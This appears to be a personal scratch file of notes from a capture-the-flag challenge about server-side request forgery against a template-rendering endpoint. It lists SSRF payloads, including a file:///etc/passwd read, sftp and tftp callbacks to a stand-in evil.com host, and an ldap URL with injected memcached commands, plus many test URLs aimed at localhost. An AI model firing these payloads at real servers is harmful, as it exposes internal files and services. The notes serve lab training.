
You've found a website that lets you input remote templates for rendering.
Your task is to exploit this system's vulnerabilities to access and retrieve a hidden flag. Good luck!

===========================
http://206.189.23.108:31030/render?use_remote=true&page=http://206.189.23.108:31030/render?page=index.tpl#

http://159.65.26.210:31705/static/js/bootstrap.bundle.min.js
http://159.65.26.210:31705/static/js/script.js

FUZZ -> /home/l4b/Downloads/thebuffet/wordlists/js-files/wordlists

http://159.65.26.210:31705/render?page=index.tpl

GET, POST. PUT. HEAD are all allowed 

============================
/render?use_remote=true&page=a
Cookie: user_ip=189.172.16.125a

http://134.209.188.158:31023/render?page=sftp:http://127.0.0.1:1337/render?page=elpepe.txt

document.getElementById 

http://159.65.26.210:31705/render


========================================
SOME PAYLOADS:

file:///etc/passwd

ssrf.php?url=sftp://evil.com:11111/

ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET

ssrf.php?url=ldap://localhost:11211/%0astats%0aquit

---------------------------------------------
---------------------------------------------
[VALID EXAMPLE]: 
http://206.189.23.108:31030/render?use_remote=true&page=http://206.189.23.108:31030/render?page=index.tpl#

[TESTS]:
http://134.209.188.158:31023/render?use_remote=true&page=http://127.0.0.1:1337/render?page=elpepe.txt
http://134.209.188.158:31023/render?use_remote=true&url=http://127.0.0.1:1337/render?page=elpepe.txt
---------------
http://134.209.188.158:31023/render?use_remote=true&page=sftp://127.0.0.1:1337/render?page=elpepe.txt
http://134.209.188.158:31023/render?use_remote=true&url=sftp://127.0.0.1:1337/render?page=elpepe.txt
---------------
http://134.209.188.158:31023/render?use_remote=true&page=tftp://127.0.0.1:1337/render?page=elpepe.txt
http://134.209.188.158:31023/render?use_remote=true&url=tftp://127.0.0.1:1337/render?page=elpepe.txt
---------------
http://134.209.188.158:31023/render?use_remote=true&page=ldap://127.0.0.1:1337/render?page=elpepe.txt
http://134.209.188.158:31023/render?use_remote=true&url=ldap://127.0.0.1:1337/render?page=elpepe.txt
========================================
RESOURCES

https://blog.appsecco.com/static-analysis-of-client-side-javascript-for-pen-testers-and-bug-bounty-hunters-f1cb1a5d5288

https://medium.com/@rudrasonkusare0222/how-to-perform-static-analysis-of-javascript-files-37b3657d92e8

-------------------------------------------------
https://github.com/projectdiscovery/interactsh
https://github.com/teknogeek/ssrf-sheriff
https://ad3sh.medium.com/how-i-found-xss-via-ssrf-vulnerability-adesh-kolte-873b30a6b89f
https://namratha-gm.medium.com/ssrf-to-local-file-read-through-html-injection-in-pdf-file-53711847cb2f
https://www.synack.com/blog/guest-blog-ssrf-using-xss-in-a-constrained-environment/
https://forum.hackthebox.com/t/official-renderquest-discussion/298332/3
------------------------------------------------
 - use: go run main.go
 - http://206.189.23.108:30304/render?use_remote=true&page=http://206.189.23.108:30304/render?&page=http://127.0.0.1:1337/render?page=elpepe.txt
 - http://206.189.23.108:30304/render?use_remote=true&page=http://206.189.23.108:30304/render?&url=http://127.0.0.1:1337/render?page=elpepe.txt

 - http://206.189.23.108:30304/render?use_remote=true&page=http://206.189.23.108:30304/render?&page=sttp://127.0.0.1:1337/render?page=elpepe.txt
 - http://206.189.23.108:30304/render?use_remote=true&page=http://206.189.23.108:30304/render?&url=sftp://127.0.0.1:1337/render?page=elpepe.txt

 - http://206.189.23.108:30304/render?use_remote=true&page=http://206.189.23.108:30304/render?&page=tftp://127.0.0.1:1337/render?page=elpepe.txt
 - http://206.189.23.108:30304/render?use_remote=true&page=http://206.189.23.108:30304/render?&url=tftp://127.0.0.1:1337/render?page=elpepe.txt
 
 - http://206.189.23.108:30304/render?use_remote=true&page=http://206.189.23.108:30304/render?&page=ldap://127.0.0.1:1337/render?page=elpepe.txt
 - http://206.189.23.108:30304/render?use_remote=true&page=http://206.189.23.108:30304/render?&url=ldap://127.0.0.1:1337/render?page=elpepe.txt 
-------------------------------------------------
 - 210.10.14.238
 -

 -
 -

 -
 -

 -
 -



==================================
- probar en vez de localhost, usar tun0 interface ip 10.10.14.238
- probar agregar ip de la maquina a a /etc/hosts

